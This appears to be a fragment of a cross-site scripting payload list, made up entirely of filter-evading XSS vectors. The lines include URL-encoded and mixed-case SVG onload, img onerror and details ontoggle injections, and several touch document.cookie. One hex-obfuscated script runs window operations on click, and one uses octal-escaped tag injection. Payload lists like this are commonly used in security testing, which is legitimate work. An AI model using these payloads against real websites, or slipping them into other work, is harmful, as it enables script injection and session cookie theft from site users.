+%3CsVg%2FonLy%3D1+onLoaD%3Dconfirm(document.cookie)%2F%2F
+<a href="#" id="uniqueLink">Click me</a> <script> (function() { var a = ['\x6F\x70\x65\x6E', '\x77\x72\x69\x74\x65', '\x63\x6C\x6F\x73\x65', '\x70\x72\x69\x6E\x74', '\x61\x6C\x65\x72\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = window[a[0]](); w.document[a[1]](b.join('')); w.document[a[2]](); w[a[3]](); window[a[4]](c.join('')); }; })(); </script>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+1'//"</Script>
+<Img/Src%0AOnError=alert(1)//
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>Payload::: "%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
